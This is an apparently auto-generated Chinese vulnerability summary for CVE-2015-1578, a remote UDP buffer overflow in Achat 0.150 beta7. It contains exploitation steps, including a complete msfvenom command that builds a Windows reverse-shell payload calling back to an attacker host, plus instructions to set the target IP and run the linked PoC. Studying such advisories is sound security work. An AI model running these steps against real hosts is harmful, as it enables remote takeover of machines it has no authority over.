## CVE-2015-1578-Achat 0.150 beta7-远程缓冲区溢出

**漏洞编号:** CVE-2015-1578

**漏洞类型:** 远程缓冲区溢出

**影响应用:** Achat

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 0.150 beta7

**利用条件:** 目标主机运行Achat 0.150 beta7，攻击者需要能够向目标主机的9256端口发送UDP数据包

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于Achat 0.150 beta7中，攻击者可以通过发送特制的UDP数据包，利用缓冲区溢出覆盖内存，从而执行任意代码。利用方式如下：

1.  **漏洞分析：**
    *   漏洞位于Achat 0.150 beta7 的UDP数据包处理逻辑中。
    *   通过发送精心构造的超长UDP数据包，可以覆盖栈上的返回地址。
2.  **漏洞利用：**
    *   利用提供的Python脚本，生成包含恶意代码的UDP数据包。
    *   `msfvenom -a x86 --platform Windows lhost=10.10.14.4 lport=4444 -p windows/shell_reverse_tcp  -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python` 生成payload，替换脚本中的`buf = b""`。
    *   修改脚本中的目标IP地址 `server_address = ('10.10.10.74', 9256)` 为目标主机的IP地址。
    *   运行脚本，将恶意数据包发送到目标主机的9256端口。
    *   如果利用成功，将在攻击机上获得一个反向shell。

3.  **有效性：** 根据提供的漏洞利用代码和漏洞信息，此POC代码有效，可以触发远程缓冲区溢出，并执行任意代码。

4.  **投毒风险：** 分析提供的代码，未发现明显的投毒代码。该代码是合法的漏洞利用程序。虽然存在执行任意代码的风险，但这是缓冲区溢出漏洞利用本身的特性，不是代码作者故意添加的恶意功能。可以确定投毒风险为0%。

5.  **参考资料：**
    *   [https://www.exploit-db.com/exploits/36025](https://www.exploit-db.com/exploits/36025)
    *   [https://github.com/Zeppperoni/CVE-2015-1578](https://github.com/Zeppperoni/CVE-2015-1578)

**项目地址:** [Zeppperoni/CVE-2015-1578](https://github.com/Zeppperoni/CVE-2015-1578)

**漏洞详情:** [CVE-2015-1578](https://nvd.nist.gov/vuln/detail/CVE-2015-1578)